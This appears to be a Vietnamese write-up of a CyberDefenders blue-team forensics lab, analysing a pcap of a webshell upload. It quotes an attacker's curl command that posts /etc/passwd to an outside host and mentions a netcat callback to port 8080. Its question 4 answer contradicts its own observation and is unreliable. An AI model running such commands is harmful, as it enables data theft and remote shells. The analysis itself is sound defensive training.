---
title: (VietNamese) CyberDefenders Writeup (Author)
date: 2026-3-20 08:19:33
top_img: /img/cyberdefenders/cyberdefenders
cover: /img/cyberdefenders/cyberdefenders.png
categories:
  - Forensics
toc: true
---
## Nơi đây lưu trữ các lời giải của các bài lab trên [Cyperdefenders](https://cyberdefenders.org) mà mình làm ^^

### [Webstrike Lab](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)

**Tool sử dụng trong bài**: Wireshark

**Scenario** (tình huống): Một điểm bất thường đã được phát hiện trong mạng nội bộ của công ty chúng tôi khi nhóm dev đã tìm thấy một tệp bất thường trên webserver. Nghi ngờ có mã độc, nhóm mạng đã chuẩn bị một tệp pcap có network traffic quan trọng để phân tích cho nhóm bảo mật. Hãy phân tích gói pcap.

Với bài lần này, ta được cung cấp 1 file **pcap** 

----



# Bài làm
## Câu  1
Vì là người tấn công thì thường là người bắt đầu gói tin, nên mình sẽ lấy địa chỉ ip source của packet đầu tiên

![image](https://hackmd.io/_uploads/ryT-NGw9Zl.png)

Mình thử check địa chỉ **117.11.88.124** ở tại vị trí nào bằng [Ip location](https://www.iplocation.net/)

![image](https://hackmd.io/_uploads/SJUa7GPcWg.png)


Vậy flag là `Tianjin`


## Câu  2
![image](https://hackmd.io/_uploads/Sy_BVfPqWe.png)

Câu này bắt chúng ta tìm xem user-agent . Vậy user-agent là gì  ?
User-agent gồm các thông tin sau : 
>Phiên bản của trình duyệt
Hệ điều hành của bên bạn
Loại thiết bị (vd: Tablet, smartphone, laptop,...)
1 vài thông tin khác về client software

Bây giờ ta filter để tìm user-agent có command sau `ip.src==117.11.88.124 && http.user_agent`
![image](https://hackmd.io/_uploads/HkLOBfD5We.png)


## Câu  3
![image](https://hackmd.io/_uploads/r10r4GPqbg.png)
Câu này hỏi chúng ta là tên của webshell được upload lên là gì 

Thử filter các packet GET và POST vì nó thường được dùng để upload file lên
`http.request.method == POST` hoặc có thể dùng File -> Export object -> HTTP .

Có 2 packet đáng nghi là 53 và 63 
![image](https://hackmd.io/_uploads/r1nJDMvq-e.png)

Soi packet 63 thì mình thấy được 1 file lạ được up lên và nó đúng với format của đề bài
![image](https://hackmd.io/_uploads/By1oPMv5We.png)
Vậy flag là : `image.jpg.php
`

## Câu  4
Câu này hỏi được dẫn thư mục mà webshell ở câu 3 được up lên  
![image](https://hackmd.io/_uploads/B1STvfD5bl.png)
Thử filter `http.request.method == POST` và follow theo HTTP mình thấy được GET lên 1 thư mục là /reviews/uploads 
![image](https://hackmd.io/_uploads/Bk9cuGv9We.png)

Vậy flag là **/reviews/upload.php** 

## Câu  5
Câu này hỏi port 
![image](https://hackmd.io/_uploads/ryKyufvc-e.png)
Nhìn ở packet 63 ở câu số 3 thì mình thấy có lệnh nc vào ip 117.11.88.124 ở port 8080 vậy flag là **8080**
## Câu  6
Hỏi kẻ địch lấy đi file nào
![image](https://hackmd.io/_uploads/SyVQYGP9-e.png)

Vì webshell đang sử dụng nc nên có thể giới hạn protool là tcp hoặc udp

Thử filter theo command : `tcp.payload and tcp and !http`

![image](https://hackmd.io/_uploads/BkqRtzv5-l.png)
Ở cuối có dòng `curl -X POST -d /etc/passwd http://117.11.88.124:443/`
Vậy là kẻ địch cố lấy đi file passwd suy ra flag là `passwd`

